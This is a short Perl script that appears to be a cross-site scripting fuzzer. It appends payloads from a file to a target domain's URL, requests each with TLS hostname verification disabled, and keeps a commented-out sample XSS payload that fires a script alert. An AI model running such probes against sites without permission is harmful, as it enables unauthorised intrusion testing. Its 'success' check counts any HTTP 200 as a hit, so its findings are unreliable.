#! /usr/bin/perl
use strict;
use warnings;
use WWW::Mechanize;
use Getopt::Long;
use LWP::UserAgent;

my $domain; # domain provided to the command line arg
my $sleep = 1;

GetOptions("domain=s"   => \$domain,
	   "sleep=i"    => \$sleep)
or die ("Error in command line arguments\n");

my $filename = './vectors.txt'; # TODO: make this modifiable

open( FH, '<', $filename) or die $!;

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
my $response;
my @success_vectors;
while ( <FH> ) {
    $response = $ua->get($domain . $_);
    if ($response->is_success) {
        print "success with vector: " . $_;
    }
    else { print "Tried and failed with vector: " . $_; }
    sleep($sleep);
}
close (FH);


#print $domain.'/?search='. '<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">'."\n";

#my $response = $ua->get($domain.'/?search='. '<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">');
#if ($response->is_success) {
#    print "success\n";
#}
#else {
#    die $response->status_line;
#}
